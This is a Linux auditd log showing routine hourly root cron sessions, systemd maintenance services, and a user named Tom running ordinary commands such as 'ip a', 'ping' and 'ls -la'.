type=LOGIN msg=audit(1789449901.054:248): pid=1162 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=19 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789449901.054:248): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1162 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=19 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789449901.054:248): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789449901.054:249): pid=1162 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789449901.058:250): pid=1163 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789449901.066:251): pid=1162 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789449901.066:252): pid=1162 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789450406.577:253): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789450406.577:254): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789451786.636:255): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789451786.636:256): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789453021.083:257): pid=1278 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789453021.087:258): pid=1278 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789453021.087:259): pid=1278 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=20 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789453021.087:259): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1278 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=20 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789453021.087:259): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789453021.087:260): pid=1278 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789453021.087:261): pid=1279 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789453021.091:262): pid=1278 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789453021.091:263): pid=1278 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=BPF msg=audit(1789455986.018:264): prog-id=13 op=LOAD
type=SERVICE_START msg=audit(1789455986.354:265): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=man-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789455986.354:266): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=man-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789455986.366:267): prog-id=13 op=UNLOAD
type=USER_ACCT msg=audit(1789456621.105:268): pid=1301 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789456621.105:269): pid=1301 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789456621.105:270): pid=1301 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=21 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789456621.105:270): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1301 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=21 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789456621.105:270): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789456621.109:271): pid=1301 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789456621.109:272): pid=1302 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789456621.113:273): pid=1301 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789456621.113:274): pid=1301 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789460221.134:275): pid=1317 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789460221.134:276): pid=1317 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789460221.134:277): pid=1317 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789460221.134:277): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1317 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=22 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789460221.134:277): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789460221.134:278): pid=1317 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789460221.138:279): pid=1318 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789460221.138:280): pid=1317 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789460221.138:281): pid=1317 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789463821.162:282): pid=1332 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789463821.162:283): pid=1332 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789463821.162:284): pid=1332 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=23 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789463821.162:284): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1332 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=23 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789463821.162:284): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789463821.166:285): pid=1332 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789463821.166:286): pid=1333 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789463821.170:287): pid=1332 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789463821.170:288): pid=1332 uid=0 auid=0 ses=23 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789467421.189:289): pid=1349 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789467421.189:290): pid=1349 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789467421.189:291): pid=1349 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=24 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789467421.189:291): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1349 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=24 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789467421.189:291): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789467421.193:292): pid=1349 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789467421.193:293): pid=1350 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789467421.197:294): pid=1349 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789467421.197:295): pid=1349 uid=0 auid=0 ses=24 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789471021.222:296): pid=1365 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789471021.226:297): pid=1365 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789471021.226:298): pid=1365 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=25 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789471021.226:298): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1365 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=25 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789471021.226:298): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789471021.226:299): pid=1365 uid=0 auid=0 ses=25 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789471021.226:300): pid=1366 uid=0 auid=0 ses=25 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789471021.230:301): pid=1365 uid=0 auid=0 ses=25 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789471021.230:302): pid=1365 uid=0 auid=0 ses=25 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789474621.252:303): pid=1383 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789474621.252:304): pid=1383 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789474621.256:305): pid=1383 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=26 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789474621.256:305): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1383 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=26 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789474621.256:305): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789474621.256:306): pid=1383 uid=0 auid=0 ses=26 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789474621.256:307): pid=1384 uid=0 auid=0 ses=26 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789474621.260:308): pid=1383 uid=0 auid=0 ses=26 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789474621.260:309): pid=1383 uid=0 auid=0 ses=26 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789478221.287:310): pid=1399 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789478221.287:311): pid=1399 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789478221.287:312): pid=1399 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=27 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789478221.287:312): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1399 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=27 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789478221.287:312): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789478221.291:313): pid=1399 uid=0 auid=0 ses=27 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789478221.291:314): pid=1400 uid=0 auid=0 ses=27 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789478221.295:315): pid=1399 uid=0 auid=0 ses=27 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789478221.295:316): pid=1399 uid=0 auid=0 ses=27 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789479566.517:317): arch=c000003e syscall=59 success=yes exit=0 a0=5616597d9e10 a1=561659904550 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1409 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789479566.517:317): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789479566.517:317): cwd="/home/Tom"
type=PATH msg=audit(1789479566.517:317): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789479566.517:317): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789479566.517:317): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789479566.517:317): proctitle=69700061
type=SYSCALL msg=audit(1789479577.361:318): arch=c000003e syscall=59 success=yes exit=0 a0=5616598454f0 a1=5616598d83b0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1410 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789479577.361:318): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789479577.361:318): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789479577.361:318): cwd="/home/Tom"
type=PATH msg=audit(1789479577.361:318): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789479577.361:318): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789479577.361:318): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789479577.361:318): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789480078.601:319): arch=c000003e syscall=59 success=yes exit=0 a0=5616598670a0 a1=5616598b8740 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1414 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="clear" exe="/usr/bin/clear" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789480078.601:319): argc=1 a0="clear"
type=CWD msg=audit(1789480078.601:319): cwd="/home/Tom"
type=PATH msg=audit(1789480078.601:319): item=0 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480078.601:319): item=1 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480078.601:319): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789480078.601:319): proctitle="clear"
type=SYSCALL msg=audit(1789480118.337:320): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d32d0 a1=5616598ffe80 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1417 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789480118.337:320): argc=3 a0="ls" a1="--color=auto" a2="-la"
type=CWD msg=audit(1789480118.337:320): cwd="/home/Tom"
type=PATH msg=audit(1789480118.337:320): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789480118.337:320): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
